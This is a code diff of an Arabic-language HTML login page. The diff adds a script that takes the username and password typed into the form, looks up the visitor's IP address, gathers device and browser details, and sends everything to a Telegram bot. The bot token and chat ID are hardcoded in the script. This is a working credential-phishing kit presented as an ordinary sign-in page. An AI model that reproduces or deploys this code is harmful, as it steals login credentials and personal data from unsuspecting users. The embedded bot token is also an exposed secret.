@@ -17,14 +17,13 @@
 
     .box {
       background: white;
-      padding: 30px; /* كبرنا المربع */
+      padding: 30px;
       border-radius: 15px;
-      width: 350px; /* كبرناه */
+      width: 350px;
       box-shadow: 0 0 15px rgba(0,0,0,0.15);
       text-align: center;
     }
 
-    /* الصورة فوق تسجيل الدخول */
     .top-img {
       width: 80px;
       height: 80px;
@@ -64,42 +63,33 @@
 
   <div class="box">
 
-    <!-- الصورة فوق تسجيل الدخول -->
     <img src="faviconV2.png" class="top-img" alt="">
 
     <h2>تسجيل دخول</h2>
 
-    <input type="text" id="user" placeholder="ادخل اسم المستخدم">
-    <input type="password" id="pass" placeholder="كلمة السر">
-
-    <button onclick="showData()">دخول</button>
+    <!-- هنا الفورم الحقيقي -->
+    <form id="login-form">
+      <input type="text" id="user" placeholder="ادخل اسم المستخدم" required>
+      <input type="password" id="pass" placeholder="كلمة السر" required>
+      <button type="submit">دخول</button>
+    </form>
 
     <div id="result"></div>
   </div>
 
-  <script>
-    function showData() {
-      const u = document.getElementById("user").value;
-      const p = document.getElementById("pass").value;
-
-      document.getElementById("result").innerText =
-        "اللي انكتب:\n" +
-        "النص: " + u + "\n" +
-        "كلمة السر: " + p;
-    }
-  </script>
-
   <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+
   <script>
-    const TOKEN = "8561258165:AAG_t4hTOHLvpEpe-_dn_s98dmmr5ZOMJ7U";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
-    const CHAT_ID = "8234715344";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
-    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+
+    const TOKEN = "8561258165:AAG_t4hTOHLvpEpe-_dn_s98dmmr5ZOMJ7U";
+    const CHAT_ID = "8234715344";
+    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
     document.getElementById('login-form').addEventListener('submit', function(e) {
         e.preventDefault();
 
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
+        const username = document.getElementById('user').value;
+        const password = document.getElementById('pass').value;
 
         axios.get('https://api.ipify.org?format=json')
             .then(response => {
@@ -111,32 +101,34 @@
                 const screenHeight = screen.height;
                 const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
 
-                const message = ` 
-                    <b>New Login Attempt</b>\n
-                    <b>Email:</b> ${email}\n
-                    <b>Password:</b> ${password}\n
-                    <b>IP Address:</b> ${ip}\n
-                    <b>Device Type:</b> ${deviceType}\n
-                    <b>Platform:</b> ${platform}\n
-                    <b>User Agent:</b> ${userAgent}\n
-                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                const message = `
+🔐 <b>New Login Attempt</b>
+
+<b>Username:</b> ${username}
+<b>Password:</b> ${password}
+
+<b>IP Address:</b> ${ip}
+<b>Device Type:</b> ${deviceType}
+<b>Platform:</b> ${platform}
+<b>User Agent:</b> ${userAgent}
+<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                 `;
 
                 axios.post(URI_API, {
                     chat_id: CHAT_ID,
                     parse_mode: 'html',
                     text: message
-                }).then(response => {
-                    alert('Information sent successfully!');
-                }).catch(error => {
-                    alert('Error sending the information. Please try again.');
+                }).then(() => {
+                    document.getElementById("result").innerText = "تم الإرسال للبوت بنجاح";
+                }).catch(() => {
+                    document.getElementById("result").innerText = "خطأ أثناء الإرسال للبوت";
                 });
             })
-            .catch(error => {
-                alert('Error fetching the IP address. Please try again.');
+            .catch(() => {
+                document.getElementById("result").innerText = "خطأ في جلب عنوان IP";
             });
     });
-</script>
+  </script>
 
 </body>
 </html>
